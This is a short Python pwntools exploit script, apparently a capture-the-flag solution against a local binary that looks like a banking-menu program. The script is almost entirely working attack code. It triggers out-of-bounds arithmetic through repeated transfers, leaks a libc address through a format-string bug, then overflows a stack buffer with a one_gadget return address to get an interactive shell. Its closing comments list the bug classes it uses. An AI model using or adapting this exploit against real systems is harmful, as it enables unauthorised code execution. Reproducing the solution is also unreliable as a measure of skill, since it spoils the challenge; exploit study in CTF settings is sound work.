from pwn import *
from tqdm import tqdm
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
p = process('./vuln')
# p = remote('localhost',1024)
libc = ELF('./libc.so.6')
# context.log_level='debug'

for i in tqdm(range(134)):
    sla(b'>',b'1')
    sla(b'Name',b'A'*(0x4c-8-1))

def transfer(fr,to,amount):
    assert amount >0
    sla(b'>',b'3')
    sla(b'from',str(fr))
    sla(b'to',str(to))
    sla(b'transfer? ',str(amount))
    
for i in tqdm(range(0x34)):
    transfer(128,0,35)
transfer(128,0,30)

for i in tqdm(range(0x34)):
    transfer(129,0,35)
transfer(129,0,30)

for i in tqdm(range(123)):
    transfer(i,130,35)
context.log_level='debug'
transfer(130,0,11)


# 0x5f5f5f -> 0x7025 -> %p
p.recvuntil(b'0x')
libc_base = int(b'0x'+p.recvuntil(b'_')[:-1],16) - libc.sym.write -20
success(hex(libc_base))
context.log_level='debug'
sla(b'>',b'1')
# 0xe5306 , 0x4497f , 0x449d3
payload = b'A'*(0x44)+p64(libc_base+0xe5306)
print(payload)
sla(b'Name',payload)

sla(b'>',b'5') 
sla(b'? ',b'134')
sla(b': ',b'asdf')

sla(b'>',b'6') 

# OoB Add/Sub
# Stack Bof
# OoB copy

# Heap OoB Add/Sub 

p.interactive()